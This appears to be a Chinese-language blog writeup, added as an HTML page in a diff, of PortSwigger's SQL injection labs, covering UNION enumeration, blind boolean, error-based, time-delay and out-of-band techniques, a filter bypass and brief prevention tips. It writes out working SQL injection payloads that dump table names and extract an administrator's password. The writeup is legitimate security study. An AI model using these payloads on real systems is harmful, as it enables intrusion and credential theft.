@@ -1,0 +1,319 @@
+
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="utf-8" />
+    <title>PortSwigger SQLi writeup | OWL_D Blog</title>
+    <meta name="author" content="owl_d" />
+    <meta name="description" content="專注於網絡安全、滲透測試和技術分享的技術部落格" />
+    <meta name="keywords" content="網絡安全, 滲透測試, CTF, 技術分享, 資安" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>OWL_D BLOG</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;OWL_D BLOG</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>PortSwigger SQLi writeup</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/3/25
+        </span>
+        
+        <span class="category">
+            <a href="/categories/%E6%9C%AA%E5%88%86%E9%A1%9E/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                未分類
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/HackMD/" style="color: #00a596">
+                    HackMD
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="SQL injection attack, querying the database type and version on MySQL and Microsoft"></a><strong>SQL injection attack, querying the database type and version on MySQL and Microsoft</strong></h2><ol>
+<li>開始會需要用到 Burp Suite Repeater 來幫忙轉成 URL Encoding 了（而且也比較方便看 response）</li>
+<li>注意註記符號 “—” 有時候要改成 “#” 才能過</li>
+<li>曾經試過的幾個payload<ol>
+<li>Gifts‘+UNION+SELECT+@@version,+NULL#</li>
+<li>Gifts’%2bUNION%2bSELECT%2b%40%40version%2c%2bNULL%23 (上一個的URL型態)</li>
+<li>Gifts’ UNION SELECT @@version, ‘abc’ #</li>
+<li>Gifts’%20UNION%20SELECT%20%40%40version%2c%20’abc’%20%23（上一個的URL型態，命中！）</li>
+</ol>
+</li>
+</ol>
+<p><img src="https://hackmd.io/_uploads/SJjoZ4IOyg.png" alt="image"></p>
+<p>結論：”+”不能亂加，然後要試試看 URL型態，而且註記符號要多試試看 ”#”</p>
+<h2 id="SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="SQL injection attack, listing the database contents on non-Oracle databases"></a><strong>SQL injection attack, listing the database contents on non-Oracle databases</strong></h2><blockquote>
+<p>整體流程：先看information_schema_tables有哪些table，再往下繼續進攻</p>
+</blockquote>
+<p>Payloads</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+UNION+SELECT+table_name,+NULL+from+information_schema.tables--</span><br></pre></td></tr></table></figure>
+<p>要記得有兩個回傳值！</p>
+<p>發現有一個叫做 users_abcdef，繼續探索！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+UNION+SELECT+column_name,null+from+information_schema.columns+where+table_name=%27users_jvzepp%27--</span><br></pre></td></tr></table></figure>
+<p>(發現這一題用”+”連接比較能夠執行，然後要注意是用information_schema_columns！)</p>
+<p><img src="https://hackmd.io/_uploads/rk3H1uUdJe.png" alt="image"></p>
+<p>往下一層走！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27+UNION+SELECT+username_jxzshr,+password_sdwxli+from+users_oogkho--</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/r1oWNYLOJx.png" alt="image"></p>
+<p>結束收工！</p>
+<p>p.s 問題點<br>其實我還是不知道該如何呼叫出這樣的表格<br>可能會再研究一陣子ww<br><img src="https://hackmd.io/_uploads/BkJw4K8OJe.png" alt="image"></p>
+<h2 id="Blind-SQL-injection-with-conditional-responses"><a href="#Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Blind SQL injection with conditional responses"></a><strong>Blind SQL injection with conditional responses</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=&lt;那時候的cookie&gt;&#x27; AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p>測起來發現welcome back可以作為 Blind SQLi 判斷依據</p>
+<p>接著改Tracking ID</p>
+<p><code>&#39; and (select &#39;a&#39; from users where username = &#39;administrator&#39; and length(password)&gt;&lt;暴力破解的地方&gt;)=&#39;a</code></p>
+<p>發現這時候welcome back消失(從length觀察最明顯！)<br>所以密碼是 20 位！<br><img src="https://hackmd.io/_uploads/HJKLPqUdkx.png" alt="image"></p>
+<p>接下來會用到一個叫做 SUBSTRING() 的函式！<br>複習一下：<code>SUBSTRING(字串, 起始位置, 長度)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUBSTRING(&#x27;abcd&#x27;, 2, 1)  -- 取得 &#x27;b&#x27;</span><br><span class="line">SUBSTRING(&#x27;abcd&#x27;, 3, 2)  -- 取得 &#x27;cd&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>接著因為要一個一個測試太麻煩了，再交給intruder做一次！<br>然後因為我想要同時從第1-20位一個一個檢測a-z,0-9<br>有兩個位置，所以使用cluster bomb!</p>
+<p><code>Cookie: TrackingId=1Be9Mx18D4iTRv39&#39; and (select SUBSTRING(password,&lt;位置1&gt;,1) from users where username = &#39;administrator&#39;)=&#39;&lt;位置2&gt;;</code></p>
+<p>最後結果！（可以搭配 View Filter 還有 Payload 1 降冪來協助方便分析）<br><img src="https://hackmd.io/_uploads/BkAv7sUu1x.png" alt="image"><br>組合起來就是 administrator 的密碼了！</p>
+<h2 id="Blind-SQL-injection-with-conditional-errors"><a href="#Blind-SQL-injection-with-conditional-errors" class="headerlink" title="Blind SQL injection with conditional errors"></a><strong>Blind SQL injection with conditional errors</strong></h2><blockquote>
+<p>因為不是要用and了，是另外一個獨立的語句<br>所以在oracle裡面要用 || 連接語法！</p>
+</blockquote>
+<p>順便稍微複習一下 SQL 的 case 用法！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT CASE</span><br><span class="line">         WHEN condition1 THEN result1</span><br><span class="line">         WHEN condition2 THEN result2</span><br><span class="line">         ELSE result_default</span><br><span class="line">       END</span><br></pre></td></tr></table></figure>
+<p>舉例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT name,</span><br><span class="line">       CASE</span><br><span class="line">         WHEN salary &lt; 3000 THEN &#x27;Low&#x27;</span><br><span class="line">         WHEN salary BETWEEN 3000 AND 5000 THEN &#x27;Medium&#x27;</span><br><span class="line">         ELSE &#x27;High&#x27;</span><br><span class="line">       END AS salary_category</span><br><span class="line">FROM employees;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/H1IfNat_Jx.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rkve4pY_yg.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HklDJraYO1l.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ryiqVpKdkl.png" alt="image"></p>
+<h2 id="Visible-error-based-SQL-injection"><a href="#Visible-error-based-SQL-injection" class="headerlink" title="Visible error-based SQL injection"></a><strong><font color="#b543ff">Visible error-based SQL injection</font></strong></h2><blockquote>
+<p>這一個 Lab 是要去故意製造<br>會顯示線索的錯誤資訊！</p>
+</blockquote>
+<p><font color="#ff8a38"></font></p>
+<p><code>TrackingId=&#39; AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--</code><br>要特別注意，因為這一個網站會去限制 TrackingID 的長度，所以一定要把原本的 ID 全部刪掉，直接用 ‘ 替代，才有足夠的空間留給我們的 payload !</p>
+<p>Q: 那為什麼不直接用前一題的 ||(select…… 就好？<br>A: 雖然可以成功把 payload 送進去，可是系統判讀成功後是會直接顯示商品畫面，而不會有任何密碼顯示，所以才要故意用 1&#x3D;cast() 去製造錯誤訊息！</p>
+<p><img src="https://hackmd.io/_uploads/HJGKsaKO1g.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/ryS3j6Ku1l.png" alt="image"></p>
+<h2 id="Blind-SQL-injection-with-time-delays-and-information-retrieval"><a href="#Blind-SQL-injection-with-time-delays-and-information-retrieval" class="headerlink" title="Blind SQL injection with time delays and information retrieval"></a><strong>Blind SQL injection with time delays and information retrieval</strong></h2><blockquote>
+<p>跟前面一樣的套路<br>只是記得 resource pool 並行要改一次一個才能看出時間的差距！</p>
+</blockquote>
+<p><img src="https://hackmd.io/_uploads/H1NuJecuyg.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/H18v1xcd1x.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Byi8Wx5_1l.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SJFzbg5_1l.png" alt="image"></p>
+<h2 id="Blind-SQL-injection-with-out-of-band-interaction"><a href="#Blind-SQL-injection-with-out-of-band-interaction" class="headerlink" title="Blind SQL injection with out-of-band interaction"></a><strong>Blind SQL injection with out-of-band interaction</strong></h2><blockquote>
+<p>這題是要透過 DNS Lookup 來完成<br>題目裡有提示說可以翻一下 BurpSuite 他們家的cheat sheet<br><img src="https://hackmd.io/_uploads/Sk-SvW5_kx.png" alt="image"><br>先用Oracle試試看<br>記得要把 BURP-COLLABORATOR-SUBDOMAIN 改成去到burpsuite的collaborator 裡面 payload copy 的連結！<br><img src="https://hackmd.io/_uploads/BkjzwWcuJg.png" alt="image"><br>看到這個畫面就代表做對了！</p>
+</blockquote>
+<h2 id="Blind-SQL-injection-with-out-of-band-data-exfiltration"><a href="#Blind-SQL-injection-with-out-of-band-data-exfiltration" class="headerlink" title="Blind SQL injection with out-of-band data exfiltration"></a><strong>Blind SQL injection with out-of-band data exfiltration</strong></h2><p>上一題的伏筆就在這一題出現了！<br>我們一樣可以用官方給的 cheat sheet 下手，只是上一題沒討論到query部分這時候就可以上場了！</p>
+<p><img src="https://hackmd.io/_uploads/Sk-SvW5_kx.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1e42Z5_kx.png" alt="image"></p>
+<p>直接在 query 部分打上我們在前幾個 lab 裡面請求密碼的方法<br>然後可以順便注意，我們後面緊接著的就是 collaborator payload<br>所以，<br><img src="https://hackmd.io/_uploads/BJGm3-qOyg.png" alt="image"><br>得到的結果看 payload 之前的前半段就是我們 query 得到的密碼！</p>
+<h2 id="SQL-injection-with-filter-bypass-via-XML-encoding"><a href="#SQL-injection-with-filter-bypass-via-XML-encoding" class="headerlink" title="SQL injection with filter bypass via XML encoding"></a><strong>SQL injection with filter bypass via XML encoding</strong></h2><blockquote>
+<p>這一題開始會需要用到 extensions!<br>會用到的叫做hackvertor，可以在 Extensions-&gt;BApp Store 裡面直接下載來用</p>
+</blockquote>
+<p>題目有直接說弱點在 check stock 的 post 上（去點一下 check stock 按鈕就會抓到！）</p>
+<p>這個 lab 最主要的特點是 Select 這個字眼會被擋掉（會顯示Attack detected擋住），所以才要用 hackvertor 來加密繞過驗證！<br>然後注意一件事：<br>如果回傳兩行會一律跳出 0 unit，其實就是代表 error 了<br>所以要用單行回傳方式（複習一下：用 | |’&lt;連接的符號&gt;’| |）<br><img src="https://hackmd.io/_uploads/Bkq5kGquye.png" alt="image"><br>繞過後就可以順利得到密碼！</p>
+<h2 id="所以怎麼預防？"><a href="#所以怎麼預防？" class="headerlink" title="所以怎麼預防？"></a><strong>所以怎麼預防？</strong></h2><ol>
+<li>參數化（可是只能用在部分query中，像是table, column, ORDER BY就不適用）</li>
+<li>白名單（補救方法）</li>
+<li>特製判斷輸入邏輯</li>
+</ol>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 OWL_D Blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;owl_d
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
